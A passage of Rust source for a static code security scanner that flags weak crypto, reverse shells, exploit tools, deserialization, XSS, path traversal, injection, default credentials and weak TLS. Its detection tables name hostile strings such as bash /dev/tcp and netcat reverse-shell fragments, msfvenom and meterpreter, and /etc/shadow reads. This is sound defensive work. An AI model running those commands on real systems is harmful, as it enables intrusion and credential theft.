            rule_id: "SEC-B11",
            message: "ECB mode — identical plaintext blocks produce identical ciphertext",
            remediation: "Use GCM, CTR, or CBC with HMAC",
        },
        // Insecure random
        CryptoPattern {
            pattern: "math.random",
            severity: Severity::High,
            rule_id: "SEC-B12",
            message: "math.random() is not cryptographically secure",
            remediation: "Use crypto.getRandomValues() or a CSPRNG",
        },
        CryptoPattern {
            pattern: "Math.random",
            severity: Severity::High,
            rule_id: "SEC-B12",
            message: "Math.random() is not cryptographically secure",
            remediation: "Use crypto.getRandomValues() or window.crypto",
        },
        CryptoPattern {
            pattern: "rand()",
            severity: Severity::Medium,
            rule_id: "SEC-B12",
            message: "rand() may not be cryptographically secure",
            remediation: "Use a CSPRNG (e.g. getrandom, OsRng in Rust)",
        },
        CryptoPattern {
            pattern: "srand(",
            severity: Severity::Medium,
            rule_id: "SEC-B12",
            message: "srand() seeds a non-cryptographic PRNG",
            remediation: "Use a CSPRNG for security-sensitive random numbers",
        },
        CryptoPattern {
            pattern: "random.random",
            severity: Severity::Medium,
            rule_id: "SEC-B12",
            message: "Python random module is not cryptographically secure",
            remediation: "Use secrets module or os.urandom()",
        },
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        for p in PATTERNS {
            if trimmed.contains(p.pattern) {
                if is_comment(trimmed, "") {
                    continue;
                }
                out.push(SecurityFinding {
                    severity: p.severity,
                    category: "crypto".to_owned(),
                    rule_id: p.rule_id.to_owned(),
                    message: p.message.to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(p.remediation.to_owned()),
                    word: None,
                    variant: None,
                });
                break; // one crypto finding per line
            }
        }
    }
}

// ── Payload scanner ──────────────────────────────────────────────────────────

/// Detect reverse shell patterns, msfvenom payloads, and backdoor indicators.
fn scan_payloads(body: &str, out: &mut Vec<SecurityFinding>) {
    struct PayloadPattern {
        pattern: &'static str,
        severity: Severity,
        rule_id: &'static str,
        message: &'static str,
    }

    static REVERSE_SHELLS: &[PayloadPattern] = &[
        // Bash reverse shells
        PayloadPattern {
            pattern: "bash -i >& /dev/tcp/",
            severity: Severity::Critical,
            rule_id: "SEC-B13",
            message: "Bash reverse shell pattern",
        },
        PayloadPattern {
            pattern: "bash -i >&/dev/tcp/",
            severity: Severity::Critical,
            rule_id: "SEC-B13",
            message: "Bash reverse shell pattern",
        },
        // Netcat reverse shells
        PayloadPattern {
            pattern: "nc -e /bin/sh",
            severity: Severity::Critical,
            rule_id: "SEC-B13",
            message: "Netcat reverse shell",
        },
        PayloadPattern {
            pattern: "nc -e /bin/bash",
            severity: Severity::Critical,
            rule_id: "SEC-B13",
            message: "Netcat reverse shell",
        },
        PayloadPattern {
            pattern: "ncat -e /bin",
            severity: Severity::Critical,
            rule_id: "SEC-B13",
            message: "Ncat reverse shell",
        },
        // Python reverse shell
        PayloadPattern {
            pattern: "import socket",
            severity: Severity::Low, // common legitimate use; only flagged at low
            rule_id: "SEC-B14",
            message: "Socket import — verify no reverse shell pattern",
        },
        PayloadPattern {
            pattern: "socket.socket(",
            severity: Severity::Low,
            rule_id: "SEC-B14",
            message: "Raw socket creation — verify legitimate use",
        },
        // Perl/Ruby reverse shells
        PayloadPattern {
            pattern: "IO.popen(",
            severity: Severity::Medium,
            rule_id: "SEC-B15",
            message: "IO.popen — potential command execution",
        },
    ];

    static EXPLOIT_TOOLS: &[PayloadPattern] = &[
        PayloadPattern {
            pattern: "msfvenom",
            severity: Severity::Critical,
            rule_id: "SEC-B16",
            message: "Metasploit payload generator reference",
        },
        PayloadPattern {
            pattern: "meterpreter",
            severity: Severity::Critical,
            rule_id: "SEC-B16",
            message: "Meterpreter payload reference",
        },
        PayloadPattern {
            pattern: "reverse_tcp",
            severity: Severity::Critical,
            rule_id: "SEC-B16",
            message: "Metasploit reverse TCP payload pattern",
        },
        PayloadPattern {
            pattern: "reverse_http",
            severity: Severity::Critical,
            rule_id: "SEC-B16",
            message: "Metasploit reverse HTTP payload pattern",
        },
        PayloadPattern {
            pattern: "bind_tcp",
            severity: Severity::Critical,
            rule_id: "SEC-B16",
            message: "Metasploit bind TCP payload pattern",
        },
        PayloadPattern {
            pattern: "shellcode",
            severity: Severity::High,
            rule_id: "SEC-B17",
            message: "Shellcode reference — verify context",
        },
    ];

    static BACKDOOR_INDICATORS: &[PayloadPattern] = &[
        PayloadPattern {
            pattern: "chmod 777",
            severity: Severity::High,
            rule_id: "SEC-B18",
            message: "chmod 777 — world-writable permissions",
        },
        PayloadPattern {
            pattern: "chmod 4",
            severity: Severity::High,
            rule_id: "SEC-B18",
            message: "setuid bit — potential privilege escalation",
        },
        PayloadPattern {
            pattern: "setuid",
            severity: Severity::Medium,
            rule_id: "SEC-B19",
            message: "setuid reference — verify no privilege escalation",
        },
        PayloadPattern {
            pattern: "setgid",
            severity: Severity::Medium,
            rule_id: "SEC-B19",
            message: "setgid reference — verify no privilege escalation",
        },
        PayloadPattern {
            pattern: "crontab",
            severity: Severity::Medium,
            rule_id: "SEC-B20",
            message: "Crontab modification — potential persistence mechanism",
        },
        PayloadPattern {
            pattern: "/etc/cron",
            severity: Severity::Medium,
            rule_id: "SEC-B20",
            message: "Cron directory access — potential persistence mechanism",
        },
        PayloadPattern {
            pattern: "visudo",
            severity: Severity::High,
            rule_id: "SEC-B21",
            message: "sudoers modification — privilege escalation",
        },
        PayloadPattern {
            pattern: "NOPASSWD",
            severity: Severity::High,
            rule_id: "SEC-B21",
            message: "NOPASSWD in sudoers — passwordless sudo",
        },
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }

        for group in [
            &REVERSE_SHELLS[..],
            &EXPLOIT_TOOLS[..],
            &BACKDOOR_INDICATORS[..],
        ] {
            for p in group {
                if trimmed.contains(p.pattern) {
                    out.push(SecurityFinding {
                        severity: p.severity,
                        category: "payload".to_owned(),
                        rule_id: p.rule_id.to_owned(),
                        message: p.message.to_owned(),
                        evidence: Some(trimmed.to_owned()),
                        line: Some(i + 1),
                        remediation: Some("Remove or justify this pattern".to_owned()),
                        word: None,
                        variant: None,
                    });
                }
            }
        }
    }
}

// ── Deserialization scanner ──────────────────────────────────────────────────

/// Detect insecure deserialization patterns.
fn scan_deserialization(body: &str, language: &str, out: &mut Vec<SecurityFinding>) {
    struct DeserPattern {
        pattern: &'static str,
        languages: &'static [&'static str], // empty = all languages
        severity: Severity,
        rule_id: &'static str,
        message: &'static str,
        remediation: &'static str,
    }

    static PATTERNS: &[DeserPattern] = &[
        DeserPattern {
            pattern: "pickle.loads",
            languages: &["python", "py"],
            severity: Severity::Critical,
            rule_id: "SEC-B22",
            message: "pickle.loads() — arbitrary code execution on untrusted data",
            remediation: "Use json.loads() or a safe serialization format",
        },
        DeserPattern {
            pattern: "pickle.load(",
            languages: &["python", "py"],
            severity: Severity::Critical,
            rule_id: "SEC-B22",
            message: "pickle.load() — arbitrary code execution on untrusted data",
            remediation: "Use json.load() or a safe serialization format",
        },
        DeserPattern {
            pattern: "cPickle.loads",
            languages: &["python", "py"],
            severity: Severity::Critical,
            rule_id: "SEC-B22",
            message: "cPickle.loads() — arbitrary code execution on untrusted data",
            remediation: "Use json.loads() or a safe serialization format",
        },
        DeserPattern {
            pattern: "yaml.load(",
            languages: &["python", "py"],
            severity: Severity::High,
            rule_id: "SEC-B23",
            message: "yaml.load() without SafeLoader — arbitrary code execution",
            remediation: "Use yaml.safe_load() or yaml.load(data, Loader=SafeLoader)",
        },
        DeserPattern {
            pattern: "yaml.unsafe_load",
            languages: &["python", "py"],
            severity: Severity::Critical,
            rule_id: "SEC-B23",
            message: "yaml.unsafe_load() — arbitrary code execution",
            remediation: "Use yaml.safe_load()",
        },
        DeserPattern {
            pattern: "Marshal.load",
            languages: &["ruby", "rb"],
            severity: Severity::High,
            rule_id: "SEC-B24",
            message: "Marshal.load — arbitrary code execution on untrusted data",
            remediation: "Use JSON.parse() for untrusted data",
        },
        DeserPattern {
            pattern: "ObjectInputStream",
            languages: &["java"],
            severity: Severity::High,
            rule_id: "SEC-B25",
            message: "Java ObjectInputStream — insecure deserialization",
            remediation: "Use a safe serialization format or add deserialization filters",
        },
        DeserPattern {
            pattern: "readObject(",
            languages: &["java"],
            severity: Severity::Medium,
            rule_id: "SEC-B25",
            message: "readObject() — verify deserialization safety",
            remediation: "Add ObjectInputFilter or use JSON/protobuf",
        },
        DeserPattern {
            pattern: "unserialize(",
            languages: &["php"],
            severity: Severity::Critical,
            rule_id: "SEC-B26",
            message: "PHP unserialize() — object injection vulnerability",
            remediation: "Use json_decode() for untrusted data",
        },
    ];

    let lang_lower = language.to_ascii_lowercase();
    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        for p in PATTERNS {
            if !p.languages.is_empty() && !p.languages.contains(&lang_lower.as_str()) {
                continue;
            }
            if trimmed.contains(p.pattern) {
                // For yaml.load, check if SafeLoader is on the same line
                if p.pattern == "yaml.load(" && trimmed.contains("SafeLoader") {
                    continue;
                }
                out.push(SecurityFinding {
                    severity: p.severity,
                    category: "deserialization".to_owned(),
                    rule_id: p.rule_id.to_owned(),
                    message: p.message.to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(p.remediation.to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ── XSS scanner ──────────────────────────────────────────────────────────────

/// Detect cross-site scripting patterns.
fn scan_xss(body: &str, language: &str, out: &mut Vec<SecurityFinding>) {
    let lang = language.to_ascii_lowercase();
    let is_web = matches!(
        lang.as_str(),
        "javascript" | "js" | "typescript" | "ts" | "html" | "jsx" | "tsx" | "php"
    );

    if !is_web {
        // Still check for innerHTML in any language (could be embedded HTML)
        for (i, line) in body.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.contains("innerHTML") && !is_comment(trimmed, language) {
                out.push(SecurityFinding {
                    severity: Severity::High,
                    category: "xss".to_owned(),
                    rule_id: "SEC-B28".to_owned(),
                    message: "innerHTML assignment — potential XSS".to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some("Use textContent or a sanitization library".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
        return;
    }

    struct XssPattern {
        pattern: &'static str,
        severity: Severity,
        rule_id: &'static str,
        message: &'static str,
        remediation: &'static str,
    }

    static PATTERNS: &[XssPattern] = &[
        XssPattern {
            pattern: "innerHTML",
            severity: Severity::High,
            rule_id: "SEC-B28",
            message: "innerHTML assignment — potential XSS",
            remediation: "Use textContent or a sanitization library (DOMPurify)",
        },
        XssPattern {
            pattern: "outerHTML",
            severity: Severity::High,
            rule_id: "SEC-B28",
            message: "outerHTML assignment — potential XSS",
            remediation: "Use safe DOM methods",
        },
        XssPattern {
            pattern: "document.write(",
            severity: Severity::High,
            rule_id: "SEC-B29",
            message: "document.write() — potential XSS and performance issues",
            remediation: "Use DOM manipulation methods instead",
        },
        XssPattern {
            pattern: "document.writeln(",
            severity: Severity::High,
            rule_id: "SEC-B29",
            message: "document.writeln() — potential XSS",
            remediation: "Use DOM manipulation methods instead",
        },
        XssPattern {
            pattern: "dangerouslySetInnerHTML",
            severity: Severity::High,
            rule_id: "SEC-B30",
            message: "React dangerouslySetInnerHTML — potential XSS",
            remediation: "Sanitize HTML with DOMPurify before rendering",
        },
        XssPattern {
            pattern: "v-html",
            severity: Severity::High,
            rule_id: "SEC-B30",
            message: "Vue v-html directive — potential XSS",
            remediation: "Sanitize HTML before binding",
        },
        XssPattern {
            pattern: "[innerHTML]",
            severity: Severity::High,
            rule_id: "SEC-B30",
            message: "Angular innerHTML binding — potential XSS",
            remediation: "Use Angular DomSanitizer",
        },
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if is_comment(trimmed, language) {
            continue;
        }
        for p in PATTERNS {
            if trimmed.contains(p.pattern) {
                out.push(SecurityFinding {
                    severity: p.severity,
                    category: "xss".to_owned(),
                    rule_id: p.rule_id.to_owned(),
                    message: p.message.to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(p.remediation.to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ── Path traversal scanner ───────────────────────────────────────────────────

/// Detect path traversal and unsafe file access patterns.
fn scan_path_traversal(body: &str, out: &mut Vec<SecurityFinding>) {
    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();

        // Direct path traversal
        if trimmed.contains("../") || trimmed.contains("..\\") {
            // Avoid false positives from relative imports in common languages
            if !trimmed.contains("import ")
                && !trimmed.contains("require(")
                && !trimmed.contains("#include")
            {
                out.push(SecurityFinding {
                    severity: Severity::Medium,
                    category: "path_traversal".to_owned(),
                    rule_id: "SEC-B31".to_owned(),
                    message: "Path traversal pattern (../) — verify input sanitization".to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(
                        "Canonicalize paths and validate they remain within allowed directories"
                            .to_owned(),
                    ),
                    word: None,
                    variant: None,
                });
            }
        }

        // Dangerous path operations with user input
        let path_patterns: &[(&str, &str)] = &[
            (
                "/etc/passwd",
                "Access to /etc/passwd — sensitive system file",
            ),
            ("/etc/shadow", "Access to /etc/shadow — password hashes"),
            (
                "/proc/self",
                "Access to /proc/self — process information leak",
            ),
        ];
        for (pat, msg) in path_patterns {
            if trimmed.contains(pat) {
                out.push(SecurityFinding {
                    severity: Severity::High,
                    category: "path_traversal".to_owned(),
                    rule_id: "SEC-B32".to_owned(),
                    message: msg.to_string(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(
                        "Validate and sanitize file paths; use allowlists".to_owned(),
                    ),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ── Hardcoded config scanner ─────────────────────────────────────────────────

/// Detect insecure hardcoded configurations.
fn scan_hardcoded_config(body: &str, out: &mut Vec<SecurityFinding>) {
    struct ConfigPattern {
        pattern: &'static str,
        severity: Severity,
        rule_id: &'static str,
        message: &'static str,
        remediation: &'static str,
    }

    static PATTERNS: &[ConfigPattern] = &[
        ConfigPattern {
            pattern: "debug=True",
            severity: Severity::Medium,
            rule_id: "SEC-B33",
            message: "Debug mode enabled — disable in production",
            remediation: "Use environment-specific configuration",
        },
        ConfigPattern {
            pattern: "DEBUG = True",
            severity: Severity::Medium,
            rule_id: "SEC-B33",
            message: "Debug mode enabled — disable in production",
            remediation: "Use environment-specific configuration",
        },
        ConfigPattern {
            pattern: "debug: true",
            severity: Severity::Medium,
            rule_id: "SEC-B33",
            message: "Debug mode enabled — disable in production",
            remediation: "Use environment-specific configuration",
        },
        ConfigPattern {
            pattern: "0.0.0.0",
            severity: Severity::Medium,
            rule_id: "SEC-B34",
            message: "Binding to 0.0.0.0 — exposed to all network interfaces",
            remediation: "Bind to 127.0.0.1 for local access or use a firewall",
        },
        ConfigPattern {
            pattern: "CORS_ALLOW_ALL",
            severity: Severity::High,
            rule_id: "SEC-B35",
            message: "CORS allow-all — any origin can make requests",
            remediation: "Restrict CORS to specific trusted origins",
        },
        ConfigPattern {
            pattern: "Access-Control-Allow-Origin: *",
            severity: Severity::High,
            rule_id: "SEC-B35",
            message: "CORS wildcard origin",
            remediation: "Restrict to specific trusted origins",
        },
        ConfigPattern {
            pattern: "AllowAnyOrigin",
            severity: Severity::High,
            rule_id: "SEC-B35",
            message: "CORS allow any origin",
            remediation: "Restrict to specific trusted origins",
        },
        ConfigPattern {
            pattern: "disable_ssl",
            severity: Severity::High,
            rule_id: "SEC-B36",
            message: "SSL/TLS disabled",
            remediation: "Always use TLS for network communication",
        },
        ConfigPattern {
            pattern: "verify=False",
            severity: Severity::High,
            rule_id: "SEC-B36",
            message: "TLS certificate verification disabled",
            remediation: "Enable certificate verification; use proper CA bundles",
        },
        ConfigPattern {
            pattern: "verify: false",
            severity: Severity::High,
            rule_id: "SEC-B36",
            message: "TLS certificate verification disabled",
            remediation: "Enable certificate verification",
        },
        ConfigPattern {
            pattern: "InsecureSkipVerify",
            severity: Severity::High,
            rule_id: "SEC-B36",
            message: "Go TLS InsecureSkipVerify — MITM vulnerable",
            remediation: "Use proper certificate validation",
        },
        ConfigPattern {
            pattern: "NODE_TLS_REJECT_UNAUTHORIZED",
            severity: Severity::High,
            rule_id: "SEC-B36",
            message: "Node.js TLS verification override",
            remediation: "Do not disable TLS verification in production",
        },
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if is_comment(trimmed, "") {
            continue;
        }
        for p in PATTERNS {
            if trimmed.contains(p.pattern) {
                out.push(SecurityFinding {
                    severity: p.severity,
                    category: "config".to_owned(),
                    rule_id: p.rule_id.to_owned(),
                    message: p.message.to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(p.remediation.to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Kali-category vulnerability scanners
// ══════════════════════════════════════════════════════════════════════════════

// ── kali-tools-web: Web application vulnerabilities ─────────────────────────

/// Detect web vulnerabilities: SSRF, LDAP injection, open redirect, CSRF, header injection.
/// Patterns derived from sqlmap, Burp Suite, and OWASP testing guides.
fn scan_web_vulns(body: &str, language: &str, out: &mut Vec<SecurityFinding>) {
    static SSRF_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
        [
            r"https?://127\.0\.0\.1",
            r"https?://localhost[:/]",
            r"https?://10\.\d{1,3}\.\d{1,3}\.\d{1,3}",
            r"https?://172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}",
            r"https?://192\.168\.\d{1,3}\.\d{1,3}",
            r"https?://169\.254\.\d{1,3}\.\d{1,3}",
            r"https?://0\.0\.0\.0",
        ]
        .iter()
        .filter_map(|p| Regex::new(p).ok())
        .collect()
    });

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if is_comment(trimmed, language) {
            continue;
        }

        // SSRF: requests to internal IPs
        for re in SSRF_PATTERNS.iter() {
            if re.is_match(trimmed) {
                out.push(SecurityFinding {
                    severity: Severity::High,
                    category: "web".to_owned(),
                    rule_id: "SEC-W01".to_owned(),
                    message: "SSRF risk: request to internal/private IP address".to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(
                        "Validate and restrict URLs to public endpoints only".to_owned(),
                    ),
                    word: None,
                    variant: None,
                });
                break;
            }
        }

        // LDAP injection: unescaped filter construction
        if (trimmed.contains(")(|") || trimmed.contains(")(cn=") || trimmed.contains("ldap_search"))
            && (trimmed.contains('+') || trimmed.contains("format") || trimmed.contains('$'))
        {
            out.push(SecurityFinding {
                severity: Severity::High,
                category: "web".to_owned(),
                rule_id: "SEC-W02".to_owned(),
                message: "LDAP injection: filter constructed with user input".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Use parameterized LDAP queries and escape special characters".to_owned(),
                ),
                word: None,
                variant: None,
            });
        }

        // Open redirect
        let open_redirect_patterns: &[&str] = &[
            "redirect(req.query",
            "redirect(req.params",
            "redirect(req.body",
            "res.redirect(req.",
            "Location: \" +",
            "Location: ' +",
            "header(\"Location: $",
            "HttpResponseRedirect(request.",
            "redirect_to params[",
        ];
        for pat in open_redirect_patterns {
            if trimmed.contains(pat) {
                out.push(SecurityFinding {
                    severity: Severity::Medium,
                    category: "web".to_owned(),
                    rule_id: "SEC-W03".to_owned(),
                    message: "Open redirect: redirect URL from user input".to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(
                        "Validate redirect URLs against an allowlist of trusted domains".to_owned(),
                    ),
                    word: None,
                    variant: None,
                });
                break;
            }
        }

        // Header injection: CRLF in headers
        if (trimmed.contains("\\r\\n") || trimmed.contains("\\x0d\\x0a"))
            && (trimmed.contains("header")
                || trimmed.contains("Header")
                || trimmed.contains("set_header"))
        {
            out.push(SecurityFinding {
                severity: Severity::High,
                category: "web".to_owned(),
                rule_id: "SEC-W04".to_owned(),
                message: "HTTP header injection: CRLF characters in header value".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Strip \\r\\n from header values; use framework-provided header setters"
                        .to_owned(),
                ),
                word: None,
                variant: None,
            });
        }

        // SQL injection: UNION SELECT, blind SQLi, time-based SQLi (beyond basic scan_injection)
        let lower = trimmed.to_ascii_lowercase();
        if lower.contains("union select") || lower.contains("union all select") {
            out.push(SecurityFinding {
                severity: Severity::Critical,
                category: "web".to_owned(),
                rule_id: "SEC-W05".to_owned(),
                message: "SQL injection: UNION SELECT pattern detected".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Use parameterized queries; never concatenate user input into SQL".to_owned(),
                ),
                word: None,
                variant: None,
            });
        }
        if lower.contains("sleep(") && (lower.contains("select") || lower.contains("where")) {
            out.push(SecurityFinding {
                severity: Severity::High,
                category: "web".to_owned(),
                rule_id: "SEC-W06".to_owned(),
                message: "Time-based SQL injection pattern (SLEEP in query)".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some("Use parameterized queries".to_owned()),
                word: None,
                variant: None,
            });
        }
    }
}

// ── kali-tools-passwords: Credential security ───────────────────────────────

/// Detect credential security issues: weak passwords, credentials in logs/URLs.
fn scan_credential_vulns(body: &str, out: &mut Vec<SecurityFinding>) {
    static PASSWORD_IN_URL: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"[a-z]+://[^/:]+:[^/@]+@").unwrap());
    static DEFAULT_CREDS: &[&str] = &[
        "admin:admin",
        "root:root",
        "admin:password",
        "admin:123456",
        "root:password",
        "root:toor",
        "test:test",
        "user:user",
        "guest:guest",
        "admin:admin123",
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if is_comment(trimmed, "") {
            continue;
        }

        // Password in URL
        if PASSWORD_IN_URL.is_match(trimmed) {
            out.push(SecurityFinding {
                severity: Severity::Critical,
                category: "credential".to_owned(),
                rule_id: "SEC-K01".to_owned(),
                message: "Credentials embedded in URL (user:pass@host)".to_owned(),
                evidence: Some(redact_secret(trimmed)),
                line: Some(i + 1),
                remediation: Some(
                    "Use environment variables or a secrets manager for credentials".to_owned(),
                ),
                word: None,
                variant: None,
            });
        }

        // Hardcoded default credentials
        for cred in DEFAULT_CREDS {
            if trimmed.contains(cred) {
                out.push(SecurityFinding {
                    severity: Severity::High,
                    category: "credential".to_owned(),
                    rule_id: "SEC-K02".to_owned(),
                    message: format!("Hardcoded default credentials: {cred}"),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(
                        "Never hardcode default credentials; require unique credentials at setup"
                            .to_owned(),
                    ),
                    word: None,
                    variant: None,
                });
                break;
            }
        }

        // Credentials in log statements
        let lower = trimmed.to_ascii_lowercase();
        if (lower.contains("log.")
            || lower.contains("logger.")
            || lower.contains("console.log")
            || lower.contains("print(")
            || lower.contains("println!"))
            && (lower.contains("password")
                || lower.contains("token")
                || lower.contains("secret")
                || lower.contains("api_key"))
        {
            out.push(SecurityFinding {
                severity: Severity::High,
                category: "credential".to_owned(),
                rule_id: "SEC-K03".to_owned(),
                message: "Possible credential value in log output".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Never log sensitive values; mask or omit credentials from log output"
                        .to_owned(),
                ),
                word: None,
                variant: None,
            });
        }

        // Plaintext password storage (no hashing)
        if (lower.contains("password") || lower.contains("passwd"))
            && (lower.contains("insert") || lower.contains("save") || lower.contains("store"))
            && !lower.contains("hash")
            && !lower.contains("bcrypt")
            && !lower.contains("argon")
            && !lower.contains("scrypt")
        {
            out.push(SecurityFinding {
                severity: Severity::High,
                category: "credential".to_owned(),
                rule_id: "SEC-K04".to_owned(),
                message: "Password stored without hashing".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Hash passwords with bcrypt, argon2, or scrypt before storage".to_owned(),
                ),
                word: None,
                variant: None,
            });
        }
    }
}

// ── kali-tools-exploitation: Code execution vulnerabilities ─────────────────

/// Detect code/command injection, template injection, and unsafe file operations.
fn scan_execution_vulns(body: &str, language: &str, out: &mut Vec<SecurityFinding>) {
    let lang = language.to_ascii_lowercase();

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if is_comment(trimmed, language) {
            continue;
        }

        // shell=True in subprocess (Python)
        if trimmed.contains("shell=True") && (lang == "python" || lang == "py") {
            out.push(SecurityFinding {
                severity: Severity::High,
                category: "execution".to_owned(),
                rule_id: "SEC-E01".to_owned(),
                message: "subprocess with shell=True — command injection risk".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some("Use shell=False and pass arguments as a list".to_owned()),
                word: None,
                variant: None,
            });
        }

        // JavaScript code injection
        let js_injection_patterns: &[(&str, &str)] = &[
            (
                "new Function(",
                "new Function() — dynamic code construction",
            ),
            (
                "vm.runInNewContext",
                "vm.runInNewContext — sandboxed code execution may escape",
            ),
            (
                "vm.runInThisContext",
                "vm.runInThisContext — code execution in current context",
            ),
            (
                "child_process.exec(",
                "child_process.exec — command execution with shell",
            ),
        ];
        if matches!(lang.as_str(), "javascript" | "js" | "typescript" | "ts") {
            for (pat, msg) in js_injection_patterns {
                if trimmed.contains(pat) {
                    out.push(SecurityFinding {
                        severity: Severity::High,
                        category: "execution".to_owned(),
                        rule_id: "SEC-E02".to_owned(),
                        message: msg.to_string(),
                        evidence: Some(trimmed.to_owned()),
                        line: Some(i + 1),
                        remediation: Some(
                            "Avoid dynamic code execution; use safe alternatives".to_owned(),
                        ),
                        word: None,
                        variant: None,
                    });
                }
            }
        }

        // Template injection patterns
        let template_injection_patterns: &[(&str, &str)] = &[
            (
                "{{",
                "Possible server-side template injection (Jinja2/Twig/Handlebars)",
            ),
            (
                "${",
                "Possible expression injection (ES6 template literal / Spring EL)",
            ),
            ("#{", "Possible expression injection (Ruby/Thymeleaf)"),
        ];
        for (pat, msg) in template_injection_patterns {
            if trimmed.contains(pat) {
                // Only flag if it looks like user input is being interpolated
                let lower = trimmed.to_ascii_lowercase();
                if lower.contains("user")
                    || lower.contains("input")
                    || lower.contains("request")
                    || lower.contains("params")
                    || lower.contains("query")
                {
                    out.push(SecurityFinding {
                        severity: Severity::High,
                        category: "execution".to_owned(),
                        rule_id: "SEC-E03".to_owned(),
                        message: msg.to_string(),
                        evidence: Some(trimmed.to_owned()),
                        line: Some(i + 1),
                        remediation: Some(
                            "Sanitize user input before template rendering; use auto-escaping"
                                .to_owned(),
                        ),
                        word: None,
                        variant: None,
                    });
                    break;
                }
            }
        }

        // Unrestricted file operations
        let lower = trimmed.to_ascii_lowercase();
        if (lower.contains("open(")
            || lower.contains("readfile(")
            || lower.contains("file_get_contents("))
            && (lower.contains("user")
                || lower.contains("request")
                || lower.contains("input")
                || lower.contains("params"))
        {
            out.push(SecurityFinding {
                severity: Severity::High,
                category: "execution".to_owned(),
                rule_id: "SEC-E04".to_owned(),
                message: "Unrestricted file operation with user-controlled path".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Validate file paths against an allowlist; canonicalize before use".to_owned(),
                ),
                word: None,
                variant: None,
            });
        }
    }
}

// ── kali-tools-sniffing-spoofing: Network security ──────────────────────────

/// Detect network security issues: plaintext HTTP, weak TLS, disabled cert validation.
fn scan_network_vulns(body: &str, out: &mut Vec<SecurityFinding>) {
    static WEAK_TLS: &[(&str, &str)] = &[
        (
            "TLSv1.0",
            "TLS 1.0 is deprecated — known vulnerabilities (BEAST, POODLE)",
        ),
        ("TLSv1.1", "TLS 1.1 is deprecated — use TLS 1.2+"),
        ("SSLv3", "SSL 3.0 is broken — POODLE attack"),
        (
            "SSLv2",
            "SSL 2.0 is broken — multiple critical vulnerabilities",
        ),
        ("TLS_RSA_WITH_", "RSA key exchange without forward secrecy"),
        ("ssl.PROTOCOL_TLSv1", "Python TLS 1.0 — deprecated"),
        ("ssl.PROTOCOL_SSLv3", "Python SSLv3 — broken"),
        ("PROTOCOL_SSLv23", "Python SSLv23 allows downgrade attacks"),
        (
            "MinVersion: tls.VersionTLS10",
            "Go TLS 1.0 minimum — too weak",
        ),
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if is_comment(trimmed, "") {
            continue;
        }

        // Weak TLS versions
        for (pat, msg) in WEAK_TLS {
            if trimmed.contains(pat) {
                out.push(SecurityFinding {
                    severity: Severity::High,
                    category: "network".to_owned(),
                    rule_id: "SEC-N01".to_owned(),
                    message: msg.to_string(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some("Use TLS 1.2 or TLS 1.3 minimum".to_owned()),
                    word: None,
                    variant: None,
                });
                break;
            }
        }

        // Mixed content: HTTP URLs in what looks like production code (not localhost/test)
        if trimmed.contains("http://")
            && !trimmed.contains("http://localhost")
            && !trimmed.contains("http://127.0.0.1")
            && !trimmed.contains("http://0.0.0.0")
            && !is_comment(trimmed, "")
        {
            // Only flag if it looks like a production URL (has a domain)
            if trimmed.contains("http://www.")
                || trimmed.contains("http://api.")
                || trimmed.contains("http://cdn.")
                || trimmed.contains("http://app.")
            {
                out.push(SecurityFinding {
                    severity: Severity::Medium,
                    category: "network".to_owned(),
                    rule_id: "SEC-N02".to_owned(),
                    message: "HTTP without TLS — data transmitted in plaintext".to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some("Use HTTPS for all production endpoints".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
